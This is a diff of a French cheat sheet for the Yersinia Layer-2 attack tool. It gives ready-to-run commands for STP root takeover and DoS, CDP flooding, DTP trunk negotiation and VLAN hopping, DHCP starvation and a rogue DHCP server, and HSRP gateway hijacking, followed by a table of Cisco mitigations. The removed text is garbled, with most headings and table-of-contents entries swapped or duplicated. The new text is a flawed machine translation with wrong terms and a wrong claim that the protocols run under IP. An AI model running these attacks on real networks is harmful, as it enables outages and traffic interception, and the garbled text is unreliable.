@@ -1,48 +1,51 @@
-# 🔍 Yersinia — fiche pratique complète
-
 <!-- language-home-navigation -->
-[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)
 
-
-[Yersinia](https://github.com/tomac/yersinia) is a powerful Layer-2 (Data Link layer) network penetration testing framework designed to analyze and exploit weaknesses in Layer-2 protocols such as STP (Spanning Tree Protocol), CDP (Cisco Discovery Protocol), DTP (Dynamic Trunking Protocol), DHCP, HSRP, and 802.1Q VLAN trunking.
+[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
 
 ---
 
-## 📋 Table des matières
 
-- [[DHCP Rogue & Starvation Attacks](#dhcp-rogue--starvation-attacks)](#supported-protocols--modes)
+# Aide-mémoire de Yersinia
+
+[Yersinia](https://github.com/tomac/yersinia) est un puissant cadre de test d'intrusion réseau de couche 2 (couche de liaison de données) conçu pour analyser et exploiter les faiblesses des protocoles de couche 2 tels que STP (Spanning Tree Protocol), CDP (Cisco Discovery Protocol), DTP (Dynamic Trunking Protocol), DHCP, HSRP et 802.1Q VLAN trunking.
+
+---
+
+## Table des matières
+
+- [Protocoles et modes pris en charge](#supported-protocols--modes)
 - [Installation](#installation)
-- [Installation](#interactive-curses-mode--i)
-- [`c`**: Cancel running attack.](#spanning-tree-protocol-stp-attacks)
-- [3. STP DoS Attack (Flood Config BPDUs)](#cisco-discovery-protocol-cdp-attacks)
-- [Dynamic Trunking Protocol (DTP) & VLAN Hopping](#dynamic-trunking-protocol-dtp--vlan-hopping)
+- [Mode Malédictions interactives (`-I`)](#interactive-curses-mode--i)
+- [Attaques du protocole Spanning Tree (STP)](#spanning-tree-protocol-stp-attacks)
+-[Attaques Cisco Discovery Protocol (CDP)](#cisco-discovery-protocol-cdp-attacks)
+- [Protocole de liaison dynamique (DTP) et saut de VLAN](#dynamic-trunking-protocol-dtp--vlan-hopping)
 - [DHCP Rogue & Starvation Attacks](#dhcp-rogue--starvation-attacks)
-- [2. Set Up Rogue DHCP Server](#hsrp--vrrp-hijacking)
-- [1. Claim Active Router Priority](#mitigation--hardening)
+- [Détournement HSRP et VRRP](#hsrp--vrrp-hijacking)
+- [Atténuation et durcissement](#atténuation--durcissement)
 
 ---
 
-## [DHCP Rogue & Starvation Attacks](#dhcp-rogue--starvation-attacks)
+## Protocoles et modes pris en charge
 
-[Mitigation & Hardening](#mitigation--hardening)
-- **STP**: Spanning Tree Protocol (Root bridge role takeover, topology change notifications).
-- **CDP**: Cisco Discovery Protocol (Device flooding, fake neighbor injection).
-- **DTP**: Dynamic Trunking Protocol (Negotiating trunk links to access all VLANs).
-- **DHCP**: Dynamic Host Configuration Protocol (Starvation & rogue DHCP servers).
-- **HSRP**: Hot Standby Router Protocol (Active gateway takeover).
-- **802.1Q / 802.1X**: Dot1Q VLAN hopping and EAPOL exhaustion.
-- **VTP**: VLAN Trunking Protocol (VLAN database deletion / overwriting).
+Yersinia cible les protocoles fonctionnant sous IP :
+- **STP :** Spanning Tree Protocol (reprise du rôle de pont racine, notifications de changement de topologie).
+- **CDP :** Cisco Discovery Protocol (inondation de périphériques, injection de faux voisins).
+- **DTP :** Dynamic Trunking Protocol (négociation des liaisons réseau pour accéder à tous les VLAN).
+- **DHCP :** Protocole de configuration d'hôte dynamique (serveurs DHCP Starvation et malveillants).
+- **HSRP :** Hot Standby Router Protocol (prise de contrôle active de la passerelle).
+- **802.1Q / 802.1X :** Saut de VLAN Dot1Q et épuisement EAPOL.
+- **VTP :** VLAN Trunking Protocol (suppression/écrasement de la base de données VLAN).
 
-DTP**: Dynamic Trunking Protocol (Negotiating trunk links to access all VLANs).
-- **`-I` (Interactive Curses)**: Full-screen terminal UI for selecting protocols, configuring attacks, and monitoring live packets.
-- **Non-interactive CLI**: Direct execution for automated scripts.
+Modes d'exécution :
+- **`-I` (Interactive Curses) :** Interface utilisateur du terminal plein écran pour sélectionner les protocoles, configurer les attaques et surveiller les paquets en direct.
+- **CLI non interactive :** Exécution directe pour les scripts automatisés.
 
 ---
 
-## Installation
-
+##Installation
 ```bash
 # Debian / Ubuntu / Kali Linux
 sudo apt-get update && sudo apt-get install -y yersinia
@@ -53,116 +56,107 @@ sudo pacman -S yersinia
 # Run in terminal
 yersinia -h
 ```
-
 ---
 
-## Installation
+## Mode Malédictions interactives (`-I`)
 
-The most practical and safe way to use Yersinia in the terminal without GUI:
+Le moyen le plus pratique et le plus sûr d'utiliser Yersinia dans le terminal sans interface graphique :
 ```bash
 sudo yersinia -I
 ```
-- **`h`**: Display help and keybindings.
-- **`g`**: Switch protocols (STP, CDP, DTP, DHCP, HSRP, etc.).
-- **`x`**: Execute attack menu for the current protocol.
-- **`c`**: Cancel running attack.
-- **`l`**: Toggle packet logging.
-- **`q`**: Exit Yersinia.
+- **`h`** : Afficher l'aide et les raccourcis clavier.
+- **`g`** : Protocoles de commutation (STP, CDP, DTP, DHCP, HSRP, etc.).
+- **`x`** : Exécute le menu d'attaque pour le protocole actuel.
+- **`c`** : Annule l'attaque en cours.
+- **`l`** : activez la journalisation des paquets.
+- **`q`** : Quittez Yersinia.
 
 ---
 
-## `c`**: Cancel running attack.
+## Attaques du protocole Spanning Tree (STP)
 
-STP elects a root bridge with the lowest Bridge ID (Priority + MAC). Yersinia can inject fake BPDUs (Bridge Protocol Data Units) to claim root status and redirect traffic through the attacker host.
+STP choisit un pont racine avec l'ID de pont le plus bas (Priorité + MAC). Yersinia peut injecter de faux BPDU (Bridge Protocol Data Units) pour revendiquer le statut root et rediriger le trafic via l'hôte de l'attaquant.
 
-### 1. Claim Root Role (BPDU Injection)
-Send BPDUs with Priority `0` and a lower MAC address to become the STP Root Bridge:
+### 1. Réclamer le rôle racine (injection BPDU)
+Envoyez des BPDU avec la priorité `0` et une adresse MAC inférieure pour devenir le pont racine STP :
 ```bash
 sudo yersinia stp -attack 1 -i eth0
 ```
-
-### 2. Claim Root Role with Topology Change (TCN)
-Force all switches to flush CAM tables and re-converge through attacker:
+### 2. Réclamez le rôle racine avec le changement de topologie (TCN)
+Forcez tous les commutateurs à vider les tables CAM et à reconverger vers l'attaquant :
 ```bash
 sudo yersinia stp -attack 2 -i eth0
 ```
-
-### 3. STP DoS Attack (Flood Config BPDUs)
-Crash or saturate switch CPU with massive conflicting BPDU frames:
+### 3. Attaque DoS STP (BPDU de configuration Flood)
+Crash ou saturation du processeur du commutateur avec des trames BPDU en conflit massif :
 ```bash
 sudo yersinia stp -attack 0 -i eth0
 ```
-
 ---
 
-## 3. STP DoS Attack (Flood Config BPDUs)
+## Attaques du protocole de découverte Cisco (CDP)
 
-CDP shares device names, models, capabilities, and software versions unauthenticated across Cisco devices.
+CDP partage les noms, modèles, fonctionnalités et versions logicielles des appareils non authentifiés sur les appareils Cisco.
 
-### 1. Flood Fake CDP Neighbors
-Exhaust switch memory and create phantom devices in `show cdp neighbors`:
+### 1. Inonder les faux voisins du CDP
+Épuisez la mémoire du commutateur et créez des appareils fantômes dans `show cdp neighbors` :
 ```bash
 sudo yersinia cdp -attack 0 -i eth0
 ```
-
-### CDP shares device names, models, capabilities, and software versions unauthenticated across Cisco devices.
-Run interactive curses mode (`yersinia -I`), press `g`, select `CDP`, and observe switch hostname, management IP, hardware model, and native VLAN ID.
+### 2. Capturez et inspectez les paquets CDP légitimes
+Exécutez le mode Cursus interactif (`yersinia -I`), appuyez sur `g`, sélectionnez `CDP` et observez le nom d'hôte du commutateur, l'adresse IP de gestion, le modèle matériel et l'ID de VLAN natif.
 
 ---
 
-## Dynamic Trunking Protocol (DTP) & VLAN Hopping
+## Protocole de liaison dynamique (DTP) et saut de VLAN
 
-Run interactive curses mode (`yersinia -I`), press `g`, select `CDP`, and observe switch hostname, management IP, hardware model, and native VLAN ID.
+DTP négocie automatiquement les liaisons trunking si les ports du commutateur sont configurés en mode `dynamic desirable` ou `dynamic auto`.
 
-### 1. Negotiate Trunking Link (DTP Desirable Packet)
-Trick the switch port into turning into an 802.1Q trunk:
+### 1. Négocier la liaison trunking (paquet DTP souhaité)
+Astuce pour que le port du commutateur se transforme en joncteur réseau 802.1Q :
 ```bash
 sudo yersinia dtp -attack 0 -i eth0
 ```
-Once the trunk is negotiated, capture frames from all VLANs or tag packets into isolated subnets using Linux 802.1Q interfaces:
+Une fois le tronc négocié, capturez les trames de tous les VLAN ou marquez les paquets dans des sous-réseaux isolés à l'aide des interfaces Linux 802.1Q :
 ```bash
 # Add VLAN subinterface for newly accessed VLAN (e.g. VLAN 20)
 sudo ip link add link eth0 name eth0.20 type vlan id 20
 sudo ip link set dev eth0.20 up
 sudo dhclient eth0.20
 ```
-
 ---
 
-## DHCP Rogue & Starvation Attacks
+## Attaques malveillantes et de famine DHCP
 
-### 1. DHCP Starvation Attack (Exhaust IP Pool)
-Send thousands of DHCP DISCOVER requests with random MAC addresses to consume all available IP addresses in the pool:
+### 1. Attaque de famine DHCP (pool d'adresses IP d'échappement)
+Envoyez des milliers de requêtes DHCP DISCOVER avec des adresses MAC aléatoires pour consommer toutes les adresses IP disponibles dans le pool :
 ```bash
 sudo yersinia dhcp -attack 1 -i eth0
 ```
-
-### DHCP Rogue & Starvation Attacks
-Deploy a rogue DHCP server with custom DNS and gateway:
+### 2. Configurer un serveur DHCP malveillant
+Déployez un serveur DHCP malveillant avec un DNS et une passerelle personnalisés :
 ```bash
 sudo yersinia dhcp -attack 2 -i eth0
 ```
-
 ---
 
-## 2. Set Up Rogue DHCP Server
+## Détournement HSRP et VRRP
 
-HSRP allows multiple routers to present a single virtual default gateway.
+HSRP permet à plusieurs routeurs de présenter une seule passerelle virtuelle par défaut.
 
-### 1. Claim Active Router Priority
-Inject HSRP HELLO packets with priority 255 to take over the default gateway IP:
+### 1. Réclamez la priorité du routeur actif
+Injectez des paquets HSRP HELLO avec la priorité 255 pour prendre en charge l'adresse IP de la passerelle par défaut :
 ```bash
 sudo yersinia hsrp -attack 0 -i eth0
 ```
-
 ---
 
-## 1. Claim Active Router Priority
+## Atténuation et durcissement
 
-|Protocol|Attack Vector|Cisco / Standard Mitigation|
+| Protocole | Vecteur d'attaque | Cisco / Atténuation standard |
 |---|---|---|
-|**STP**|Fake Root Bridge Injection|`spanning-tree bpduguard enable` on access ports; `spanning-tree rootguard` on inter-switch links.|
-|**DTP**|Rogue Trunk Negotiation|`switchport mode access` & `switchport nonegotiate` on all user-facing access ports.|
-|**CDP**|Flooding / Info Disclosure|`no cdp run` (globally) or `no cdp enable` on untrusted interface ports.|
-|**DHCP**|Starvation & Rogue Server|Enable `ip dhcp snooping`, limit rate per port, configure trusted uplink ports.|
-|**HSRP**|Priority Hijacking|Configure MD5 authentication with secret keys (`standby 1 authentication md5 key-string <SECRET>`).|
+| **STP** | Injection de faux pont radiculaire | `spanning-tree bpduguard enable` sur les ports d'accès ; `spanning-tree rootguard` sur les liaisons inter-commutateurs. |
+| **PAO** | Négociation de troncs malveillants | `switchport mode access` et `switchport nonegotiate` sur tous les ports d'accès destinés aux utilisateurs. |
+| **CDP** | Inondations / Divulgation d'informations | `no cdp run` (globalement) ou `no cdp enable` sur les ports d'interface non approuvés. |
+| **DHCP** | Famine et serveur voyou | Activez `ip dhcp snooping`, limitez le débit par port, configurez les ports de liaison montante de confiance. |
+| **HSRP** | Détournement prioritaire | Configurez l'authentification MD5 avec des clés secrètes (`standby 1 authentication md5 key-string <SECRET>`). |
